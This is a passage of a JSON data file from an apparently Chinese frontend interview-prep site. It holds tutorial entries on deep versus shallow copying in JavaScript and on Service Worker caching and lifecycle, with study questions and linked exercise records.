{a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\nconst cloneObj = JSON.parse(JSON.stringify(originObj));\nconsole.log(cloneObj === originObj); // false\n\ncloneObj.a = 'aa';\ncloneObj.c = [1,1,1];\ncloneObj.d.dd = 'doubled';\n\nconsole.log(cloneObj); // {a:'aa',b:'b',c:[1,1,1],d:{dd:'doubled'}};\nconsole.log(originObj); // {a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\n```\n\n确实是深拷贝，也很方便。但是，这个方法只能适用于一些简单的情况。比如下面这样的一个对象就不适用：\n\n```javascript\nconst originObj = {\n  name:'axuebin',\n  sayHello:function(){\n    console.log('Hello World');\n  }\n}\nconsole.log(originObj); // {name: \"axuebin\", sayHello: ƒ}\nconst cloneObj = JSON.parse(JSON.stringify(originObj));\nconsole.log(cloneObj); // {name: \"axuebin\"}\n```\n\n发现在 `cloneObj` 中，有属性丢失了。。。那是为什么呢？\n\n在 `MDN` 上找到了原因：\n\n> If undefined, a function, or a symbol is encountered during conversion it is either omitted (when it is found in an object) or censored to null (when it is found in an array). JSON.stringify can also just return undefined when passing in \"pure\" values like JSON.stringify(function(){}) or JSON.stringify(undefined).\n\n`undefined`、`function`、`symbol` 会在转换过程中被忽略。。。\n\n明白了吧，就是说如果对象中含有一个函数时（很常见），就不能用这个方法进行深拷贝。\n\n### 递归的方法\n\n递归的思想就很简单了，就是对每一层的数据都实现一次 `创建对象->对象赋值` 的操作，简单粗暴上代码：\n\n```javascript\nfunction deepClone(source){\n  const targetObj = source.constructor === Array ? [] : {}; // 判断复制的目标是数组还是对象\n  for(let keys in source){ // 遍历目标\n    if(source.hasOwnProperty(keys)){\n      if(source[keys] && typeof source[keys] === 'object'){ // 如果值是对象，就递归一下\n        targetObj[keys] = source[keys].constructor === Array ? [] : {};\n        targetObj[keys] = deepClone(source[keys]);\n      }else{ // 如果不是，就直接赋值\n        targetObj[keys] = source[keys];\n      }\n    } \n  }\n  return targetObj;\n}\n```\n\n我们来试试：\n\n```javascript\nconst originObj = {a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\nconst cloneObj = deepClone(originObj);\nconsole.log(cloneObj === originObj); // false\n\ncloneObj.a = 'aa';\ncloneObj.c = [1,1,1];\ncloneObj.d.dd = 'doubled';\n\nconsole.log(cloneObj); // {a:'aa',b:'b',c:[1,1,1],d:{dd:'doubled'}};\nconsole.log(originObj); // {a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\n```\n\n可以。那再试试带有函数的：\n\n```javascript\nconst originObj = {\n  name:'axuebin',\n  sayHello:function(){\n    console.log('Hello World');\n  }\n}\nconsole.log(originObj); // {name: \"axuebin\", sayHello: ƒ}\nconst cloneObj = deepClone(originObj);\nconsole.log(cloneObj); // {name: \"axuebin\", sayHello: ƒ}\n```\n\n也可以。搞定。\n\n是不是以为这样就完了？？ 当然不是。\n\n## JavaScript中的拷贝方法\n\n我们知道在 `JavaScript` 中，数组有两个方法 `concat` 和 `slice` 是可以实现对原数组的拷贝的，这两个方法都不会修改原数组，而是返回一个修改后的新数组。\n\n同时，ES6 中 引入了 `Object.assgn` 方法和 `...` 展开运算符也能实现对对象的拷贝。\n\n那它们是浅拷贝还是深拷贝呢？\n\n### concat\n\n> The concat() method is used to merge two or more arrays. This method does not change the existing arrays, but instead returns a new array.\n\n该方法可以连接两个或者更多的数组，但是它不会修改已存在的数组，而是返回一个新数组。\n\n看着这意思，很像是深拷贝啊，我们来试试：\n\n```javascript\nconst originArray = [1,2,3,4,5];\nconst cloneArray = originArray.concat();\n\nconsole.log(cloneArray === originArray); // false\ncloneArray.push(6); // [1,2,3,4,5,6]\nconsole.log(originArray); [1,2,3,4,5];\n```\n\n看上去是深拷贝的。\n\n我们来考虑一个问题，如果这个对象是多层的，会怎样。\n\n```javascript\nconst originArray = [1,[1,2,3],{a:1}];\nconst cloneArray = originArray.concat();\nconsole.log(cloneArray === originArray); // false\ncloneArray[1].push(4);\ncloneArray[2].a = 2; \nconsole.log(originArray); // [1,[1,2,3,4],{a:2}]\n```\n\n`originArray` 中含有数组 `[1,2,3]` 和对象 `{a:1}`，如果我们直接修改数组和对象，不会影响 `originArray`，但是我们修改数组 `[1,2,3]` 或对象 `{a:1}` 时，发现 `originArray` 也发生了变化。\n\n**结论：`concat` 只是对数组的第一层进行深拷贝。**\n\n### slice\n\n> The slice() method returns a shallow copy of a portion of an array into a new array object selected from begin to end (end not included). The original array will not be modified.\n\n解释中都直接写道是 `a shallow copy` 了 ~\n\n但是，并不是！\n\n```javascript\nconst originArray = [1,2,3,4,5];\nconst cloneArray = originArray.slice();\n\nconsole.log(cloneArray === originArray); // false\ncloneArray.push(6); // [1,2,3,4,5,6]\nconsole.log(originArray); [1,2,3,4,5];\n```\n\n同样地，我们试试多层的数组。\n\n```javascript\nconst originArray = [1,[1,2,3],{a:1}];\nconst cloneArray = originArray.slice();\nconsole.log(cloneArray === originArray); // false\ncloneArray[1].push(4);\ncloneArray[2].a = 2; \nconsole.log(originArray); // [1,[1,2,3,4],{a:2}]\n```\n\n果然，结果和 `concat` 是一样的。\n\n**结论：`slice` 只是对数组的第一层进行深拷贝。**\n\n### Object.assign()\n\n> The Object.assign() method is used to copy the values of all enumerable own properties from one or more source objects to a target object. It will return the target object.\n\n复制复制复制。\n\n那到底是浅拷贝还是深拷贝呢？\n\n自己试试吧。。\n\n**结论：`Object.assign()` 拷贝的是属性值。假如源对象的属性值是一个指向对象的引用，它也只拷贝那个引用值。**\n\n### ... 展开运算符\n\n```javascript\nconst originArray = [1,2,3,4,5,[6,7,8]];\nconst originObj = {a:1,b:{bb:1}};\n\nconst cloneArray = [...originArray];\ncloneArray[0] = 0;\ncloneArray[5].push(9);\nconsole.log(originArray); // [1,2,3,4,5,[6,7,8,9]]\n\nconst cloneObj = {...originObj};\ncloneObj.a = 2;\ncloneObj.b.bb = 2;\nconsole.log(originObj); // {a:1,b:{bb:2}}\n```\n\n**结论：`...` 实现的是对象第一层的深拷贝。后面的只是拷贝的引用值。**\n\n### 首层浅拷贝\n\n我们知道了，会有一种情况，就是对目标对象的第一层进行深拷贝，然后后面的是浅拷贝，可以称作“首层浅拷贝”。\n\n我们可以自己实现一个这样的函数：\n\n```javascript\nfunction shallowClone(source) {\n  const targetObj = source.constructor === Array ? [] : {}; // 判断复制的目标是数组还是对象\n  for (let keys in source) { // 遍历目标\n    if (source.hasOwnProperty(keys)) {\n      targetObj[keys] = source[keys];\n    }\n  }\n  return targetObj;\n}\n```\n\n我们来测试一下：\n\n```javascript\nconst originObj = {a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\nconst cloneObj = shallowClone(originObj);\nconsole.log(cloneObj === originObj); // false\ncloneObj.a='aa';\ncloneObj.c=[1,1,1];\ncloneObj.d.dd='surprise';\n```\n\n经过上面的修改，`cloneObj` 不用说，肯定是 `{a:'aa',b:'b',c:[1,1,1],d:{dd:'surprise'}}` 了，那 `originObj` 呢？刚刚我们验证了 `cloneObj === originObj` 是 `false`，说明这两个对象引用地址不同啊，那应该就是修改了 `cloneObj` 并不影响 `originObj`。\n\n```javascript\nconsole.log(cloneObj); // {a:'aa',b:'b',c:[1,1,1],d:{dd:'surprise'}}\nconsole.log(originObj); // {a:'a',b:'b',c:[1,2,3],d:{dd:'surprise'}}\n```\n\nWhat happend?\n\n`originObj` 中关于 `a`、`c`都没被影响，但是 `d` 中的一个对象被修改了。。。说好的深拷贝呢？不是引用地址都不一样了吗？\n\n原来是这样：\n\n1.  从 `shallowClone` 的代码中我们可以看出，我们只对第一层的目标进行了 `深拷贝` ，而第二层开始的目标我们是直接利用 `=` 赋值操作符进行拷贝的。\n2.  so，第二层后的目标都只是复制了一个引用，也就是浅拷贝。\n\n## 总结\n\n1.  赋值运算符 `=` 实现的是浅拷贝，只拷贝对象的引用值；\n2.  JavaScript 中数组和对象自带的拷贝方法都是“首层浅拷贝”；\n3.  `JSON.stringify` 实现的是深拷贝，但是对目标对象有要求；\n4.  若想真正意义上的深拷贝，请递归。",
    "testPoint": "### 1. **基本概念**\n   - 解释什么是浅拷贝和深拷贝吗？两者有什么不同？\n   - 在 JavaScript 中，为什么要区分浅拷贝和深拷贝？它们分别适用于什么场景？\n\n### 2. **浅拷贝的实现**\n   - JavaScript 中有哪些方法可以实现浅拷贝？请列举几种常见方法，比如 `Object.assign` 和扩展运算符 `...`。\n   - 使用浅拷贝时，如果对象内有嵌套的引用类型，会发生什么情况？为什么这种情况可能导致意外行为？\n\n### 3. **深拷贝的实现**\n   - 如何在 JavaScript 中实现深拷贝？常见的方式有哪些？\n   - 你能解释为什么 `JSON.parse(JSON.stringify(obj))` 可以实现深拷贝吗？它有哪些局限性？\n\n### 4. **常见的深拷贝方案**\n   - 除了 `JSON.parse(JSON.stringify())`，你还知道哪些深拷贝的方法或库？比如使用递归或第三方库 `lodash` 的 `_.cloneDeep`。\n   - 对于递归实现深拷贝，你会如何处理循环引用问题（对象内部互相引用的情况）？\n\n### 5. **性能与内存的考量**\n   - 深拷贝和浅拷贝在性能上有何差异？你会在什么情况下优先选择浅拷贝？\n   - 在大型对象或频繁复制对象的情况下，你如何优化深拷贝的性能？\n\n### 6. **拷贝的实践与应用场景**\n   - 在实际开发中，哪些场景适合使用浅拷贝，哪些场景适合使用深拷贝？请举例说明。\n   - 在状态管理库（如 Redux）中，为什么常常使用浅拷贝而不是深拷贝来更新状态？\n\n### 7. **拷贝中的特殊情况**\n   - 浅拷贝或深拷贝在处理特殊对象（如 `Date`、`RegExp`、`Map`、`Set` 等）时会遇到什么问题？如何处理这些情况？\n   - 如果对象中包含函数或 `Symbol` 类型的属性，浅拷贝和深拷贝会如何处理这些数据？\n\n### 8. **调试与错误处理**\n   - 是否遇到过由于误用浅拷贝和深拷贝而引发的 bug？是如何调试和解决的？\n   - 如果拷贝后的对象行为不符合预期，如何检查问题的来源？\n\n### 9. **深拷贝的优化与自定义实现**\n   - 请简要描述如何编写一个自定义的深拷贝函数，它能处理大部分数据类型，包括循环引用和特殊类型。\n   - 在需要深拷贝的地方，如果数据结构较为复杂，你会选择自定义实现还是引入第三方库？为什么？",
    "exerciseKeyList": "[\"8244fd41-2b94-4179-887f-177501ddf280\",\"a6a869f2-a5f5-451e-8f1d-eb25cea4750f\",\"a5330a58-5be0-4f4f-8394-43392311ddaa\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 19,
    "createAt": "2024-11-07T12:43:42.000Z",
    "updateAt": "2024-11-08T14:41:13.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "8244fd41-2b94-4179-887f-177501ddf280",
        "title": "object.assign和扩展运算法是深拷贝还是浅拷贝，两者区别是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:20:08.000Z",
        "updateAt": "2024-07-20T11:57:26.000Z"
      },
      {
        "exerciseKey": "a5330a58-5be0-4f4f-8394-43392311ddaa",
        "title": "深拷贝浅拷贝有什么区别？怎么实现深拷贝？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:48:49.000Z",
        "updateAt": "2024-08-10T19:49:21.000Z"
      },
      {
        "exerciseKey": "a6a869f2-a5f5-451e-8f1d-eb25cea4750f",
        "title": "实现深拷贝",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:09:05.000Z",
        "updateAt": "2021-07-07T00:13:25.000Z"
      }
    ]
  },
  "156": {
    "id": 156,
    "tagId": 10,
    "title": "Service Worker",
    "explanation": "# 引言\n\n我们经常可以听到 **Worker** 这个名词，比如本文要介绍的 **ServiceWorker** 后面就带着一个 **Worker** 的单词，那么 **Worker** 实际上指的是什么呢？\n\n在介绍 **Worker** 的定义之前，先来回忆一下浏览器的渲染原理。\n\n在一个 tab 打开的时候，浏览器会给这个 tab 创建一个新的渲染进程（renderer process），如下图：\n\n![](https://static.ecool.fun//article/93986b7a-62bb-4cb5-bcc9-9ba80aadb8d4.awebp)\n\n> 图1：Chrome 浏览器的多进程架构\n> \n> 图片来源：[developer.chrome.com/blog/inside…](https://developer.chrome.com/blog/inside-browser-part1/ \"https://developer.chrome.com/blog/inside-browser-part1/\")\n\n在每一个渲染进程中，都会有一个主线程（Main Thread），负责 JavaScript 的执行以及浏览器的渲染（JavaScript 的执行与 UI 渲染是一个互相阻塞的流程）。\n\n![](https://static.ecool.fun//article/c330dc12-0d12-462c-be1a-a8222b61efbc.awebp)\n\n> 图2：浏览器一帧的剖析\n> \n> 图片来源：[aerotwist.com/blog/the-an…](https://aerotwist.com/blog/the-anatomy-of-a-frame/ \"https://aerotwist.com/blog/the-anatomy-of-a-frame/\")\n\n如果 JavaScript 执行时间过久（比如超过 33.33 ms），那么一帧内留给 UI 渲染的时间不多，如果这时候网页有正在执行的动画，那么用户就会感受到卡顿。\n\n> 10 FPS：能够达成基本的视觉残留（参考：定格动画至少需要 12 帧每秒以上）\n> \n> 30 FPS以下：让人感觉到明显的卡顿和不适感\n> \n> 30-50 FPS：因人而异\n> \n> 50-60 FPS：流畅\n\n一个 Worker，指的是一个可以在后台独立执行 JavaScript 脚本。它存在于一个单独的 worker 线程，即使执行一些长任务也不会阻塞主线程响应用户操作（如鼠标点击、动画等）。\n\n> 另外 Worker 也指使用 `new Worker()` 构造函数创建的一个对象，可以用在主线程与 worker 线程的通信\n\n![](https://static.ecool.fun//article/fec3b69a-1ebd-465c-8a45-4ec719dccfb6.awebp)\n\n> 图3：worker 线程独立于主线程之外\n> \n> 图片来源：[developer.chrome.com/blog/inside…](https://developer.chrome.com/blog/inside-browser-part3/ \"https://developer.chrome.com/blog/inside-browser-part3/\")\n\nWorker 与 主线程之间可以通过 `postMessage` 进行通信：\n\n![](https://static.ecool.fun//article/fdf78a3d-4e2c-4386-af76-136547bcae76.awebp)\n\n> worker 线程与主线程通信方式\n> \n> Worker 一般有其独立的上下文：[WorkerGlobalScope](https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope#see_also \"https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope#see_also\")，其全局变量一般用 self 来表示，如果使用 window 则会报错\n\n# ServiceWorker 介绍\n\n本文要介绍的 ServiceWorker 是一种特化的 Worker，专门来处理跟网页有关的资源（assets），在浏览器和真正的服务端之间扮演一个代理（Proxy）的角色。ServiceWorker 同时引入了缓存（Cache），可以用来存储一个网络响应。\n\n> 下文会继续介绍 Cache 相关的知识。\n\n![](https://static.ecool.fun//article/7986eb0e-9767-44d8-8f2c-7b04e10e5302.awebp)\n\n> 图：ServiceWorker 中重要的几个角色\n\n一般来说，ServiceWorker 处理的就是页面与缓存、服务器之间的关系（下文有详细介绍）。\n\nServiceWorker 的出现是为了解决下面的两个问题：\n\n-   离线请求（提供类似于 App 的用户体验，类 App 的生命周期）\n\n-   性能优化\n\n## Cache\n\n由于 ServiceWorker 是一种特化型 Worker，它专门处理资源相关的逻辑，简单来说就是做一些缓存（但不止与此），下面先介绍一下 ServiceWorker 做缓存用到的一个底层 [API：Cache](https://developer.mozilla.org/en-US/docs/Web/API/Cache \"https://developer.mozilla.org/en-US/docs/Web/API/Cache\")\n\nCache 提供一个`Request -> Response`的持久缓存，除非显式删除，存储在 Cache 里面的数据不会主动过期，同时也不会主动去更新，需要手动维护其更新。\n\n![](https://static.ecool.fun//article/71ff26e7-d2e4-4a24-acea-40acfe056866.awebp)\n\n> 图：Cache 存储的是 Request -> Response 的键值对\n\n### Cache 基础用法\n\n一个域之内可以存在多个 Cache，可以通过一个名字来标识对应的 Cache：\n\n> 可以通过 [CacheStorage](https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage/open \"https://developer.mozilla.org/en-US/docs/Web/API/CacheStorage/open\") 来获取对应 Cache 对象，有同源策略\n\n```csharp\n// caches extends CacheStorage，是 window / self 上面的一个全局变量\n// 下面是通过一个 cacheName 来获取对应的缓存对象\nconst cache = await caches.open('hello-cache-v1');\n```\n\n然后可以通过 `Cache.put` 方法将缓存设置进去\n\n```ini\nconst request = new Request('/samples/service-worker/basic/', { method: 'GET' })\nconst response = await fetch(request)\nconst cache = await caches.open('hello-cache-v1');\ncache.put(request, response)\n```\n\n结果如下：\n\n![](https://static.ecool.fun//article/f381ecc6-0109-4ed9-8460-fa54ab3d6f34.awebp)\n\n下一次获取的时候可以：\n\n```csharp\nconst request = new Request('/samples/service-worker/basic/', { method: 'GET' })\nconst cache = await caches.open('hello-cache-v1');\nconst matchResponse = await cache.match(request) // 此处可以获取上次存储的 Response\n\n// 如果是带上路由 query 参数的形式\nconst request2 = new Request('/samples/service-worker/basic/?a=1', { method: 'GET' })\nconst matchResponse = await cache.match(request2, { ignoreSearch: false }) // 如果ignoreSearch=false（默认） 的情况下，此时匹配不上\n```\n\n![](https://static.ecool.fun//article/a2b58dbb-fbc3-4e55-a361-64231f5cdd6f.awebp)\n\n上述即为 Cache 最基础的用法，另外 Cache 还提供了一些更加简便的方法，比如直接写入 url 即可自动请求缓存的 `Cache.addAll` 方法等\n\n> 更多请参考：[developer.mozilla.org/en-US/docs/…](https://developer.mozilla.org/en-US/docs/Web/API/Cache#methods \"https://developer.mozilla.org/en-US/docs/Web/API/Cache#methods\")\n\n### Cache 匹配逻辑\n\n> 具体可以查看 [request-matches-cached-item-algorithm](https://w3c.github.io/ServiceWorker/#request-matches-cached-item-algorithm \"https://w3c.github.io/ServiceWorker/#request-matches-cached-item-algorithm\")\n\n> 其中 match 方法的 options 中，`ignoreMethod`, `ignoreSearch`,`ignoreVary` 选项可能会影响最后匹配的结果\n\n1.  判断 Method 是否匹配，是则继续下一步\n2.  判断 url 是否匹配，是则继续下一步\n3.  如果 Response 的 header 不包含 `Vary`，则匹配该 Response，否则下一步\n4.  匹配 Vary 对应的各种 header 字段\n\n其实在实际操作中，一般很少将实际发出的 Request 和 Response 直接缓存在 Cache 中，一般都会经过一层复制，以获得更自由的控制：\n\n> 可以参考 workbox 源码：[copyResponse.ts](https://github.com/GoogleChrome/workbox/blob/v6/packages/workbox-core/src/copyResponse.ts \"https://github.com/GoogleChrome/workbox/blob/v6/packages/workbox-core/src/copyResponse.ts\")，将 Response 进行一层 clone\n\n```ini\nconst request = new Request('/?a=1', { method: 'GET' })\nconst response = await fetch(request)\n\nconst url = new URL(request.url);\nurl.search = ''\nconst requestWillCache = new Request(url, {...request})\n\nconst clonedResponse = response.clone();\nconst responseInit = {\n    headers: new Headers({...clonedResponse.headers, 'vary': 'Content-Type'}),\n    status: clonedResponse.status,\n    statusText: clonedResponse.statusText,\n};\nconst body = clonedResponse.body\nconst responseWillCache = new Response(body, responseInit);\n\ncache.put(requestWillCache, responseWillCache)\n```\n\n### Cache 容量\n\n每一个域名可用的空间不一样，可以通过下面的代码获取：\n\n```ini\nconst estimate = await navigator.storage.estimate();\nconst usage = estimate.usage / estimate.quota * 100).toFixed(2);\n```\n\n![](https://static.ecool.fun//article/636a91ab-7693-4cb8-bb0d-2cc31fcf40d9.awebp)\n\n## 作用范围与客户端\n\n介绍完 Cache 之后，我们将重新聚焦回本文的主角 ServiceWorker\n\n### 作用范围 Scope\n\n一个 ServiceWorker 可以被多个页面注册，但是一个页面只允许注册一个 ServiceWorker\n\n一个 ServiceWorker 会有一个作用范围（Scope），表示在这个范围内的页面才可以注册该 ServiceWorker，默认的作用范围是 ServiceWorker 所在路径的上一级。\n\n如：路径是 `/subdir/sw.js` 的 ServiceWorker，其作用范围默认是 `/subdir/**` ，因此`/subdir/**`下面的页面（如`/subdir/a.html`）可以正常注册该 ServiceWorker。\n\n如果有一个超出作用范围的页面（如`/subdir2/b.html`）想要注册该 ServiceWorker，浏览器就会报错。要解决这种报错，可以通过下面的方式来设置：\n\n1.  在注册 ServiceWorker 的时候，显示指定一个作用范围\n\n```c\nnavigator.serviceWorker.register(\"/subdir/sw.js\", { scope: \"/\" })\n    .then(() => {\n      console.log(\"安装成功，scope 被调整为 '/'\");\n    });\n```\n\n2.  同时在 ServiceWorker js 文件的请求上加上 HTTP 相应头 `Service-Worker-Allowed : /`\n\n> 只有当响应头和注册时候显示指定作用范围，才能够注册成功\n\n![](https://static.ecool.fun//article/3cad87c8-d201-443a-b5e2-55a777fc1844.awebp)\n\n> 图：ServiceWorker 的作用范围\n\n### 客户端 Client\n\n对于 ServiceWorker 来说，一个页面是其控制的一个客户端\n\n> ServiceWorker 也可以作用于其他 Worker\n\n可以通过 Worker 中的 `Clients` 来获取当前 ServiceWorker 控制客户端的实例\n\n```rust\nconst allClients = await clients.matchAll({\n    includeUncontrolled: true, // 更新 serviceWorker 的时候可能有一些还没生效\n    type: \"window\", \"worker\", \"sharedworker\" or \"all\", // 默认是 “window”\n});\n```\n\n## 生命周期\n\n> [web.dev/service-wor…](https://web.dev/service-worker-lifecycle/ \"https://web.dev/service-worker-lifecycle/\")\n\nServiceWorker 设置生命周期的目的是：\n\n-   使得离线使用成为可能（APP式的体验）\n-   允许一个新版本的 ServiceWorker 准备好，而不影响当前正在发挥作用的 ServiceWorker\n-   可以确保一个页面在其生命周期内始终被同一个 ServiceWorker 控制或者不被 ServiceWorker 控制\n-   可以确保一个时刻只有一个版本的 ServiceWorker 正在运行\n\n为什么要强调一个时刻内只有一个版本的 ServiceWorker 正在运行呢？\n\n想象一下这个场景：当你打开一个页面被 ServiceWorkerV1 控制了，然后打开一个相同路径的 tab，然后这个 tab 被一个另一个 ServiceWorkerV2 控制，但是他们的缓存逻辑可能不一样，比如 V2 版本可能会清空一些它用不到的缓存，而这个缓存可能恰好是 V1 版本必须的时候，就有可能会导致一些错误、数据丢失的问题。\n\n另外，必要的时候，其实可以通过一些操作来覆盖这种默认行为\n\n![](https://static.ecool.fun//article/96b974f1-8da1-4f53-93b5-e255ae16a771.awebp)\n\n> 图：ServiceWorker 生命周期\n\n### Install\n\n注册之后会先触发 `install` 事件，如果 `event.waitUntil` 有传入 promise，当 promise 为 `resolved` 状态的时候，该事件才算完成，然后到下一个状态。如果 promise 被 `rejected`，那么 ServiceWorker 注册失败。\n\n如果 ServiceWorker 代码中存在语法等错误，那么注册也会失败，并且不会生效\n\nInstall 事件在 ServiceWorker 更新前只会运行一次\n\n```typescript\n// entry.html\n<script>\n  // 注册 ServiceWorker\nnavigator.serviceWorker.register('/sw.js')\n    .then(reg => console.log('SW registered!', reg))\n    .catch(() => {\n      // 如果 ServiceWorker 网络请求失败、js 解析失败、作用范围不对都会导致整个注册失败\n    })\n// 注册成功之后可以通过下面来查看当前页面的 ServiceWorker 实例\nconst currentSW = navigator.serviceWorker.controller;\n</script>\n\n// sw.js\nself.addEventListener('install', event => {\n  console.log('V1 installing…');\n\n  // 可以在这个时机进行一些后续处理必须的前置缓存处理(Precaching)\n  event.waitUntil(\n    caches.open('static-v1').then(cache => cache.add('/cat.svg'))\n  );\n});\n```\n\n### Activate\n\n当 ServiceWorker 准备好控制客户端，并且可以处理类似 `sync`、`push` 事件的时候，就会触发 `activate` 事件进入 activating 状态。\n\n> 一般情况下，在 ServiceWorker 更新的时候，才会有较长的 installed -> activating 中间的 waiting 状态，因为其需要等旧的 ServiceWorker 卸载才能控制新的页面。\n> \n> 首次则是直接到达 installed 状态之后直接会触发 `activate` 事件进入 activating 状态\n\n需要注意的是：首次注册 ServiceWorker 之后页面并不会马上被 ServiceWorker 控制，一般情况下，页面需要通过 ServiceWorker 请求之后，后面才会被 ServiceWorker 控制。\n\n如果想要不重新加载页面来激活 ServiceWorker，可以使用`clients.claim()`覆盖默认行为，该方法可以让 ServiceWorker 跳过等待状态，直接控制页面。\n\n一般可以在 Activate 这个阶段处理上一个 ServiceWorker 相关的动作，如：\n\n-   清除、迁移上一个版本 ServiceWorker Cache 数据\n\n> 另外，ServiceWorker 安装的时候，activate 事件返回一个 reject promise 暂时是一个未定义的行为，所以需要额外关注，详情看下面两个 Issue\n> \n> 一般而言，这个步骤不应该存在“失败”的状态\n> \n> [#659 There should be no such thing as \"fail to activate\"](https://github.com/w3c/ServiceWorker/issues/659 \"https://github.com/w3c/ServiceWorker/issues/659\")\n> \n> [#1372 Clarification on what happens during a terminated activation](https://github.com/w3c/ServiceWorker/issues/1372 \"https://github.com/w3c/ServiceWorker/issues/1372\")\n\n### 更新\n\n一般 ServiceWorker 更新是在下面的时机上触发的：\n\n-   用户访问到 ServiceWorker 控制范围下的页面\n-   浏览器触发给 ServiceWorker 的 `push` 或者 `sync` 事件（过去 24h 内触发过的可能会不再检查更新）\n-   当页面通过 `register` 执行 ServiceWorker 注册，并且 url 跟上一次注册 url 不相同或者控制范围 Scope 的时候\n-   页面可以手动执行 ServiceWorker 的 `update` 方法来触发更新\n\n> 很多浏览器在检查 ServiceWorker 更新的时候，都会忽略请求 header 上 cache 相关的字段\n> \n> 这个行为可以通过 `updateViaCache` 来覆盖\n\n> 一般注册之后需要通过 unregister 来卸载，否则即使回退到没有 ServiceWorker 的版本，其也会继续生效。\n\nServiceWorker 更新是通过浏览器通过逐字节对比来确定的，如果 ServiceWorker 文件的字节发生了改变，那么会执行 ServiceWorker 更新操作，否则依旧使用旧的 ServiceWorker。\n\n> Worker 内部如果要加载其他脚本，有一个专门的方法`importScripts()`，通过 `importScripts()` 方法加载的脚本也会进行逐字节对比\n> \n> 使用该方法可以同时加载多个脚本。\n\n新的 ServiceWorker 会有自己另外一个实例来执行其初始化操作，而不会影响当前正在运行的实例。\n\n如果新的 ServiceWorker install 失败了，那么这个 ServiceWorker 将会被丢弃，旧的 ServiceWorker 会依旧生效\n\n当 install 成功了之后，会进入 waiting 状态，知道旧的 ServiceWorker 实例不控制任何客户端（相关 tab 都关闭的情况下）\n\n使用 `self.skipWaiting()` 可以跳过这个 waiting 状态，直接使得新的实例生效，但是这时候要考虑新旧的无缝衔接\n\n注意一个特殊 case：当刷新页面的时候，当前页面不会卸载直到收到新的页面请求，这意味着刷新或者一些跳转操作不会使得新的 ServiceWorker 正常工作，而是使用旧的 ServiceWorker 实例\n\n> ServiceWorker 的更新其实有点类似于 Chrome 的更新，新版本安装了之后，需要点击一个按钮才生效\n\n## 一个简单的使用例子\n\n```javascript\nconst expectedCaches = ['static-v2'];\n\nself.addEventListener('install', event => {\n  console.log('V2 installing…');\n\n  // 下面的 svg 图片是执行后续操作的前提条件，所以放在 install 事件执行\n  // 如果缓存失败了，意味着后续 ServiceWorker 逻辑不能正常运行\n  // 而 install 事件失败的情况下，整个 ServiceWorker 会被丢弃，不会影响页面功能\n  event.waitUntil(\n    caches.open('static-v2').then(cache => cache.add('/horse.svg'))\n  );\n});\n\nself.addEventListener('activate', event => {\n  // 此处是旧的 ServiceWorker 不再控制客户端，新 ServiceWorker 准备接管的时机\n  // 这个时候可以清理旧 ServiceWorker 的一些缓存，做一些数据迁移等操作\n  event.waitUntil(\n    caches.keys().then(keys => Promise.all(\n      keys.map(key => {\n        if (!expectedCaches.includes(key)) {\n          return caches.delete(key);\n        }\n      })\n    )).then(() => {\n      console.log('V2 now ready to handle fetches!');\n    })\n  );\n});\n\n// 当客户端发起请求，会触发 fetch 事件\n// 这里的逻辑就是客户端与真正服务端之间的 proxy 角色\n// 可以通过 fetch 转发客户端请求，也可以返回客户端在 cache 中请求\nself.addEventListener('fetch', event => {\n  const url = new URL(event.request.url);\n\n  // serve the horse SVG from the cache if the request is\n  // same-origin and the path is '/dog.svg'\n  if (url.origin == location.origin && url.pathname == '/dog.svg') {\n    event.respondWith(caches.match('/horse.svg'));\n  }\n});\n```\n\n## 其他事件\n\nServiceWorker 还可以接受 notification、push、sync 等事件，不过已经涉及到 PWA 相关的内容了，感兴趣可以查看下面的文章：\n\n1.  [周期性后台同步 API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Periodic_Background_Synchronization_API \"https://developer.mozilla.org/en-US/docs/Web/API/Web_Periodic_Background_Synchronization_API\")\n2.  [后台同步](https://developer.chrome.com/blog/background-sync/#the_solution \"https://developer.chrome.com/blog/background-sync/#the_solution\")\n3.  [推送](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/showNotification \"https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/showNotification\")\n\n# 缓存策略\n\n一般使用 ServiceWorker 都会跟缓存打交道，下面介绍几种日常中常见的缓存策略\n\n> [developer.chrome.com/docs/workbo…](https://developer.chrome.com/docs/workbox/caching-strategies-overview/ \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/\")\n\n## Cache only\n\n请求只走缓存，如果缓存不存在，则需要处理（如返回 404 页面）\n\n缓存更新需要借助 ServiceWorker 主动更新（比如浏览器在空闲时候触发的 xx 事件）\n\n![](https://static.ecool.fun//article/f9873c50-b64f-4b2c-812b-be4cf11dc472.awebp)\n\n> 图片来源：[Strategies for service worker caching](https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate\")\n\n## Network only\n\n请求只走网络，就像没有 ServiceWorker 一样\n\n![](https://static.ecool.fun//article/973d8f09-dc9f-47bd-b358-e1b7212d554f.awebp)\n\n> 图片来源：[Strategies for service worker caching](https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate\")\n\n## Cache first, falling back to network\n\n如果缓存存在的话，先走缓存，否则兜底走网络\n\n![](https://static.ecool.fun//article/c613e87f-9664-4a1e-9893-25874b92edbc.awebp)\n\n> 图片来源：[Strategies for service worker caching](https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate \"https://developer.chrome.com/docs/workbox/caching-strategies-overview/#stale-while-revalidate\")\n\n这种策略更像是原生 App 的更新策略\n\n## Network first, falling back to 